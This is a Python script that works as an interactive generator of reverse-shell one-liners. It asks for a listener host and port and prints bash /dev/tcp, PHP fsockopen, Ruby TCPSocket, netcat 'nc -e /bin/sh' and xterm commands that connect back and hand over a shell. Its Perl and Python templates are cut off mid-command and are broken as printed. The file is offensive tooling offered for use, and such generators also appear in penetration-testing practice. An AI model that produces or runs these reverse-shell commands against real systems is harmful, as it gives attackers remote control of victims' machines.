from colorama import Fore, Style

def reversegen():
    print('')
    print(Fore.GREEN + "[*] " + Style.RESET_ALL + "Available reverse shells: " + Fore.RED + "BASH, PHP, PERL, PYTHON, RUBY, NETCAT, XTERM" + Style.RESET_ALL)
    print('')
            
    shell = input(Fore.CYAN + "[SHEEL-CREATE] " + Style.RESET_ALL + "[>] Shell: ")

    if shell == 'BASH':
        bash = input(Fore.CYAN + "[BASH] " + Style.RESET_ALL + "[>] LHOST: ")
        bash2 = input(Fore.CYAN + "[BASH] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "bash -i >& /dev/tcp/" + bash + "/" + bash2 + " 0>&1")
        print('')

    elif shell == 'PERL':
        perl = input(Fore.CYAN + "[PERL] " + Style.RESET_ALL + "[>] LHOST: ")
        perl2 = input(Fore.CYAN + "[PERL] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "perl -e 'use Socket;$i='" + perl + "';$p="+ perl2 +";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in")
        print('')

    elif shell == 'PHP':
        php = input(Fore.CYAN + "[PHP] " + Style.RESET_ALL + "[>] LHOST: ")
        php2 = input(Fore.CYAN + "[PHP] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "php -r '$sock=fsockopen('" + php +"'," + php2 +");exec('/bin/sh -i <&3 >&3 2>&3');'")
        print('')

    elif shell == 'PYTHON':
        python = input(Fore.CYAN + "[PYTHON] " + Style.RESET_ALL + "[>] LHOST: ")
        python2 = input(Fore.CYAN + "[PYTHON] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + python +"'," + python2 + "))")
        print('')

    elif shell == 'RUBY':
        ruby = input(Fore.CYAN + "[RUBY] " + Style.RESET_ALL + "[>] LHOST: ")
        ruby2 = input(Fore.CYAN + "[RUBY] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "ruby -rsocket -e'f=TCPSocket.open('" + ruby +"'," + ruby2 + ").to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'")
        print('')

    elif shell == 'NETCAT':
        netcat = input(Fore.CYAN + "[NETCAT] " + Style.RESET_ALL + "[>] LHOST: ")
        netcat2 = input(Fore.CYAN + "[NETCAT] " + Style.RESET_ALL + "[>] LPORT: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "nc -e /bin/sh " + netcat, netcat2)
        print('')

    elif shell == 'XTERM':
        xterm = input(Fore.CYAN + "[XTERM] " + Style.RESET_ALL + "[>] LHOST: ")

        print('')
        print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "xterm -display " + xterm + ":1" )
        print('')

    else:
        print('')
        print(Fore.RED + "[*]" + Style.RESET_ALL + " Not available: " + shell)
        print('')